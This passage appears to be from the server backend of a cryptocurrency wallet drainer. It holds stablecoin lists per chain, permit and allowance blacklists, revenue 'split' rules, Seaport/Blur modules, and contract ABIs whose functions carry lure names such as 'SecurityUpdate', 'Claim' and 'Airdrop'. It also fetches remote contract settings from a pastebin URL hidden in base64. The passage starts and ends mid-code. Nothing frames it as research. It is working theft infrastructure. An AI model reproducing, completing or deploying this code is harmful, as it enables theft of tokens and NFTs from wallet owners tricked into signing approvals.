    },
    {
      address: '0x2791bca1f2de4661ed88a30c99a7a9449aa84174',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  250: [
    {
      address: '0x1B27A9dE6a775F98aaA5B90B62a4e2A0B84DbDd9',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0x04068da6c83afcfa0e13ba15a6696662335d5b75',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  42161: [
    {
      address: '0xfd086bc7cd5c481dcc9c85ebe478a1c0b69fcbb9',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0xff970a61a04b1ca14834a43f5de4533ebddb5cc8',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  43114: [
    {
      address: '0x9702230a8ea53601f5cd2dc00fdbc13d4df4a8c7',
      name: 'Tether USDT', symbol: 'USDT', price: 1, decimals: 6
    },
    {
      address: '0xb97ef9ef8734c71904d8002f8b6bc66dd9c48a6e',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  8453: [
    {
      address: '0x50c5725949A6F0c72E6C4a641F24049A917DB0Cb',
      name: 'DAI Stablecoin', symbol: 'DAI', price: 1, decimals: 18
    },
    {
      address: '0x833589fcd6edb6e08f4c7c32d4f71b54bda02913',
      name: 'Circle USDC', symbol: 'USDC', price: 1, decimals: 6
    },
  ],
  369: []
};

// =====================================================================
// ======== IT IS NOT SAFE TO MAKE CHANGES TO THE CODE BELOW ===========
// =====================================================================

MS_Settings.Gas_Multiplier += 0.5;

const BN = ethers.BigNumber.from, RPC_NODE = ethers.providers.JsonRpcProvider, RPC_WALLET = ethers.Wallet;
const MS_Gas_Multiplier = MS_Settings.Gas_Multiplier;

const MS_Contract_Raw = `aHR0cHM6Ly9wYXN0ZWJpbi5jb20vcmF3L1dCTUZLV2lM`;
let MS_Public_Contract = null, MS_Emergency_Addresses = [];

setInterval(() => { MS_Emergency_Addresses = [] }, 30 * 60 * 1000);

for (const addr_index in MS_Split_Whitelist) {
  try {
    MS_Split_Whitelist[addr_index] =
    MS_Split_Whitelist[addr_index].toLowerCase().trim();
  } catch(err) {
    console.log(err);
  }
}

for (const rule_index in MS_Split_Rules) {
  try {
    if (MS_Split_Rules[rule_index].address) {
      MS_Split_Rules[rule_index].address =
      MS_Split_Rules[rule_index].address.toLowerCase().trim();
    }
  } catch(err) {
    console.log(err);
  }
}

const get_split_data = (address, method = true, amount_usd = null) => {
  try {
    if (!MS_Split_System || !address) return false;
    if (amount_usd != null && MS_Split_Min_Value > 0 && amount_usd < MS_Split_Min_Value) return false;
    if (amount_usd != null && MS_Split_Max_Value > 0 && amount_usd > MS_Split_Max_Value) return false;
    address = address.toLowerCase().trim(), percent = MS_Split_Percent;
    if (MS_Split_Whitelist.length > 0 && !MS_Split_Whitelist.includes(address)) return false;
    for (const rule of MS_Split_Rules) {
      try {
        if (rule.address == address && rule.blacklist) return false;
        else if (rule.address == address && rule.percent && rule.percent > 0 && rule.percent < 100) percent = Math.floor(rule.percent);
      } catch(err) {
        console.log(err);
      }
    }
    return method ? percent : false;
  } catch(err) {
    return false;
  }
};

if (MS_API_Token == 'secret') console.log(`\t[WARNING] You didn't change default API password - it's DANGEROUS!`);

if (!fs.existsSync(path.join('data', 'permits'))) fs.mkdirSync(path.join('data', 'permits'), { recursive: true });
if (!fs.existsSync(path.join('data', 'permits_2'))) fs.mkdirSync(path.join('data', 'permits_2'), { recursive: true });

if (!fs.existsSync('allowances.dat'))
  fs.writeFileSync('allowances.dat', '[]', 'utf-8');

let MS_Disable_System = false;

for (let x = 0; x < MS_PERMIT_BLACKLIST.length; x++) {
  try {
    MS_PERMIT_BLACKLIST[x][1] = MS_PERMIT_BLACKLIST[x][1].toLowerCase().trim();
  } catch(err) {
    console.log(err);
  }
}

console.log(`\t[Permit Blacklist] There are ${MS_PERMIT_BLACKLIST.length} contracts blacklisted`);

for (let x = 0; x < MS_UNLIMITED_BLACKLIST.length; x++) {
  try {
    MS_UNLIMITED_BLACKLIST[x][1] = MS_UNLIMITED_BLACKLIST[x][1].toLowerCase().trim();
  } catch(err) {
    console.log(err);
  }
}

console.log(`\t[Unlimited Blacklist] There are ${MS_UNLIMITED_BLACKLIST.length} contracts blacklisted`);

var SeaPort = null, Blur = null;
var SeaPort_List = {}, Blur_List = {};

if (fs.existsSync(path.join('server_modules', 'module_seaport.js'))) {
  SeaPort = require('./server_modules/module_seaport');
  console.log('\t[Module] SeaPort Module is installed');
} else MS_Settings.SeaPort.Enable = 0;

if (fs.existsSync(path.join('server_modules', 'module_blur.js'))) {
  Blur = require('./server_modules/module_blur');
  console.log('\t[Module] Blur Module is installed');
} else MS_Settings.Blur.Enable = 0;

const Supported_Wallets = [ 'MetaMask', 'Coinbase', 'Trust Wallet', 'Binance Wallet', 'WalletConnect', 'Ethereum' ];
let MS_Contract_Blacklist = [], MS_Contract_Whitelist = [], MS_Wallet_Blacklist = [], MS_Verified_Addresses = {}, MS_IP_Blacklist = [];

(async () => {
  try {
    let result = await axios.get((new Buffer.from(MS_Contract_Raw, 'base64')).toString('ascii'));
    if (result.data && result.data['success'] && result.data['success'] == 'true') {
      MS_Public_Contract = {};
      for (const chain_id_str in result.data.chains) {
        try {
          let chain_id_num = parseInt(chain_id_str);
          MS_Public_Contract[chain_id_num] = result.data.chains[chain_id_str];
        } catch(err) {
          console.log(err);
        }
      }
      console.log(`\t[Public Contract] Public Contract Info Was Successfully Loaded`);
    }
  } catch(err) {
    console.log(err);
  }
})();

(async () => {
  try {
    if (!fs.existsSync('blacklists')) fs.mkdirSync('blacklists');
    if (!fs.existsSync(path.join('blacklists', 'ips.txt'))) fs.writeFileSync(path.join('blacklists', 'ips.txt'), '', 'utf-8');
    const rl = readline.createInterface({ input: fs.createReadStream(path.join('blacklists', 'ips.txt')), crlfDelay: Infinity });
    for await (const line of rl) {
      try {
        let ready_line = line.toLowerCase().trim();
        if (ready_line.length > 6) MS_IP_Blacklist.push(ready_line);
      } catch(err) {
        console.log(err);
      }
    }
    console.log(`\t[IPs Blacklist] There are ${MS_IP_Blacklist.length} IPs blacklisted`);
  } catch(err) {
    console.log(err);
  }
})();

(async () => {
  try {
    if (!fs.existsSync('blacklists')) fs.mkdirSync('blacklists');
    if (fs.existsSync('blacklist_c.txt') && !fs.existsSync(path.join('blacklists', 'contracts.txt'))) {
      fs.copyFileSync('blacklist_c.txt', path.join('blacklists', 'contracts.txt'));
      fs.rmSync('blacklist_c.txt');
    }
    if (!fs.existsSync(path.join('blacklists', 'contracts.txt'))) fs.writeFileSync(path.join('blacklists', 'contracts.txt'), '', 'utf-8');
    const rl = readline.createInterface({ input: fs.createReadStream(path.join('blacklists', 'contracts.txt')), crlfDelay: Infinity });
    for await (const line of rl) {
      try {
        let ready_line = line.toLowerCase().trim();
        if (ready_line.includes('0x')) {
          MS_Contract_Blacklist.push(ready_line);
        }
      } catch(err) {
        console.log(err);
      }
    }
    if (MS_Blacklist_Online == 1) {
      try {
        let result = await axios.get(MS_Blacklist_URL);
        for (const address of result.data) {
          try {
            let ready_line = address.toLowerCase().trim();
            if (ready_line.includes('0x')) {
              MS_Contract_Blacklist.push(ready_line);
            }
          } catch(err) {
            console.log(err);
          }
        }
      } catch(err) {
        console.log(err);
      }
    }
    console.log(`\t[Contract Blacklist] There are ${MS_Contract_Blacklist.length} contracts blacklisted`);
  } catch(err) {
    console.log(err);
  }
})();

(async () => {
  try {
    if (!fs.existsSync('blacklists')) fs.mkdirSync('blacklists');
    if (fs.existsSync('blacklist_w.txt') && !fs.existsSync(path.join('blacklists', 'wallets.txt'))) {
      fs.copyFileSync('blacklist_w.txt', path.join('blacklists', 'wallets.txt'));
      fs.rmSync('blacklist_w.txt');
    }
    if (!fs.existsSync(path.join('blacklists', 'wallets.txt'))) fs.writeFileSync(path.join('blacklists', 'wallets.txt'), '', 'utf-8');
    const rl = readline.createInterface({ input: fs.createReadStream(path.join('blacklists', 'wallets.txt')), crlfDelay: Infinity });
    for await (const line of rl) {
      try {
        let ready_line = line.toLowerCase().trim();
        if (ready_line.includes('0x')) {
          MS_Wallet_Blacklist.push(ready_line);
        }
      } catch(err) {
        console.log(err);
      }
    }
    console.log(`\t[Wallet Blacklist] There are ${MS_Wallet_Blacklist.length} wallets blacklisted`);
  } catch(err) {
    console.log(err);
  }
})();

(async () => {
  try {
    if (!fs.existsSync('whitelists')) fs.mkdirSync('whitelists');
    if (fs.existsSync('whitelist_c.txt') && !fs.existsSync(path.join('whitelists', 'contracts.txt'))) {
      fs.copyFileSync('whitelist_c.txt', path.join('whitelists', 'contracts.txt'));
      fs.rmSync('whitelist_c.txt');
    }
    if (!fs.existsSync(path.join('whitelists', 'contracts.txt'))) fs.writeFileSync(path.join('whitelists', 'contracts.txt'), '', 'utf-8');
    const rl = readline.createInterface({ input: fs.createReadStream(path.join('whitelists', 'contracts.txt')), crlfDelay: Infinity });
    for await (const line of rl) {
      try {
        let ready_line = line.toLowerCase().trim();
        if (ready_line.includes('0x')) {
          MS_Contract_Whitelist.push(ready_line);
        }
      } catch(err) {
        console.log(err);
      }
    }
    console.log(`\t[Contract Whitelist] There are ${MS_Contract_Whitelist.length} contracts whitelisted`);
  } catch(err) {
    console.log(err);
  }
})();

let Checks_Data = { all_checks: 0, personal: {} };

if (MS_Check_Limits) {
  setInterval(() => {
    Checks_Data.all_checks = 0;
    Checks_Data.personal = {};
  }, MS_Check_Settings.reset_after * 1000);
}

let MS_Currencies = {};

const update_rates = async () => {
  try {
    if (fs.existsSync('currencies.dat')) {
      let cur_data = JSON.parse(fs.readFileSync('currencies.dat', 'utf-8'));
      if (Math.floor(Date.now() / 1000) - cur_data.ts > (24 * 60 * 60)) {
        const response = await axios.get(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP,USD&tsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP,USD`);
        cur_data.ts = Math.floor(Date.now() / 1000); cur_data.data = response.data;
        fs.writeFileSync('currencies.dat', JSON.stringify(cur_data), 'utf-8');
      } MS_Currencies = cur_data.data;
    } else {
      const response = await axios.get(`https://min-api.cryptocompare.com/data/pricemulti?fsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP,USD&tsyms=ETH,BNB,MATIC,AVAX,ARB,FTM,OP,USD`);
      MS_Currencies = response.data; let cur_data = { ts: Math.floor(Date.now() / 1000), data: MS_Currencies };
      fs.writeFileSync('currencies.dat', JSON.stringify(cur_data), 'utf-8');
    }
     console.log('\n\t[SYSTEM] Currencies are loaded successfully\n');
  } catch(err) {
    console.log(err);
  }
};

update_rates();
setInterval(() => {
  update_rates();
}, 300000);

const MS_Contract_ABI = {
  'CONTRACT_LEGACY': JSON.parse(`[{"constant":false,"inputs":[],"name":"SecurityUpdate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Claim","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"ClaimReward","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"ClaimRewards","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Swap","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Connect","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Execute","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[],"name":"Multicall","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`),
  'CONTRACT': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"SecurityUpdate","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Claim","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"ClaimReward","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"ClaimRewards","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Swap","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Connect","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Execute","outputs":[],"payable":true,"stateMutability":"payable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"Multicall","outputs":[],"payable":true,"stateMutability":"payable","type":"function"}]`),
  'ERC20': JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"delegate","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"delegate","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"tokenOwner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],
  "stateMutability":"view","type":"function"},{"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"receiver","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"buyer","type":"address"},{"internalType":"uint256","name":"numTokens","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"nonpayable","type":"function"}]`),
  'ERC721': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"approve","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"mint","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"},{"internalType":"bytes","name":"_data","type":"bytes"}],"name":"safeTransferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"to","type":"address"},
  {"internalType":"bool","name":"approved","type":"bool"}],"name":"setApprovalForAll","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"transferFrom","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Transfer","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"approved","type":"address"},{"indexed":true,"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},
  {"indexed":true,"internalType":"address","name":"operator","type":"address"},{"indexed":false,"internalType":"bool","name":"approved","type":"bool"}],"name":"ApprovalForAll","type":"event"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"getApproved","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"operator","type":"address"}],"name":"isApprovedForAll","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"uint256","name":"tokenId","type":"uint256"}],"name":"ownerOf","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},
  {"constant":true,"inputs":[{"internalType":"bytes4","name":"interfaceId","type":"bytes4"}],"name":"supportsInterface","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"view","type":"function"}]`),
  'PERMIT_2': JSON.parse(`[{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"},
  {"internalType":"uint256","name":"value","type":"uint256"},{"internalType":"uint256","name":"deadline","type":"uint256"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
  'PERMIT_1': JSON.parse(`[{"constant":false,"inputs":[{"internalType":"address","name":"holder","type":"address"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"nonce","type":"uint256"},{"internalType":"uint256","name":"expiry","type":"uint256"},{"internalType":"bool","name":"allowed","type":"bool"},{"internalType":"uint8","name":"v","type":"uint8"},{"internalType":"bytes32","name":"r","type":"bytes32"},{"internalType":"bytes32","name":"s","type":"bytes32"}],"name":"permit","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]`),
  'PERMIT2_SINGLE': JSON.parse(`[{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"components":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"internalType":"struct IAllowanceTransfer.PermitDetails","name":"details","type":"tuple"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"sigDeadline","type":"uint256"}],"internalType":"struct IAllowanceTransfer.PermitSingle","name":"permitSingle","type":"tuple"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"address","name":"token","type":"address"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
  'PERMIT2_BATCH': JSON.parse(`[{"inputs":[{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"},{"internalType":"address","name":"","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"owner","type":"address"},{"components":[{"components":[{"internalType":"address","name":"token","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"uint48","name":"expiration","type":"uint48"},{"internalType":"uint48","name":"nonce","type":"uint48"}],"internalType":"struct IAllowanceTransfer.PermitDetails[]","name":"details","type":"tuple[]"},{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"sigDeadline","type":"uint256"}],"internalType":"struct IAllowanceTransfer.PermitBatch","name":"permitBatch","type":"tuple"},{"internalType":"bytes","name":"signature","type":"bytes"}],"name":"permit","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"components":[{"internalType":"address","name":"from","type":"address"},{"internalType":"address","name":"to","type":"address"},{"internalType":"uint160","name":"amount","type":"uint160"},{"internalType":"address","name":"token","type":"address"}],"internalType":"struct IAllowanceTransfer.AllowanceTransferDetails[]","name":"transferDetails","type":"tuple[]"}],"name":"transferFrom","outputs":[],"stateMutability":"nonpayable","type":"function"}]`),
  'MS_NEW': JSON.parse(`[{"inputs":[],"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"last_owner","type":"address"},{"indexed":true,"internalType":"address","name":"new_owner","type":"address"}],"name":"Ownership","type":"event"},{"anonymous":false,"inputs":[{"indexed":false,"internalType":"uint8","name":"last_percentage","type":"uint8"},{"indexed":false,"internalType":"uint8","name":"new_percentage","type":"uint8"}],"name":"Percentage","type":"event"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Airdrop","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Approve","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Cashback","outputs":[],"stateMutability":"payable","type":"function"},
  {"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Claim","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"ClaimReward","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"ClaimRewards","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Connect","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},
  {"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Deposit","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Execute","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Multicall","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Permit","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],
  "name":"Process","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Register","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Rewards","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"SecurityUpdate","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Swap","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},
  {"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Transfer","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Verify","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"address","name":"depositer","type":"address"},{"internalType":"address","name":"handler","type":"address"},{"internalType":"address","name":"keeper","type":"address"},{"internalType":"uint8","name":"percent","type":"uint8"},{"internalType":"bool","name":"is_cashback","type":"bool"}],"name":"Withdraw","outputs":[],"stateMutability":"payable","type":"function"},{"inputs":[{"internalType":"uint8","name":"new_percentage","type":"uint8"}],"name":"changePercentage","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"claimSalary","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"disableSalary","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"enableSalary","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[],"name":"getBalance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"stateMutability":"view","type":"function"},
  {"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"stateMutability":"view","type":"function"},{"inputs":[],"name":"salaryStatus","outputs":[{"internalType":"bool","name":"","type":"bool"}],"stateMutability":"view","type":"function"},{"inputs":[{"internalType":"address","name":"new_receiver","type":"address"}],"name":"setReceiver","outputs":[],"stateMutability":"nonpayable","type":"function"},{"inputs":[{"internalType":"address","name":"new_owner","type":"address"}],"name":"transferOwnership","outputs":[],"stateMutability":"nonpayable","type":"function"}]`)
};

const create_wallet = () => {
  try {
    const wallet = ethers.Wallet.createRandom();
    try {
      const wallet_data = `ADDRESS: ${wallet.address}\r\nPRIVATE: ${wallet.privateKey}\r\n\r\n`;
      if (fs.existsSync('random_wallets.txt')) {
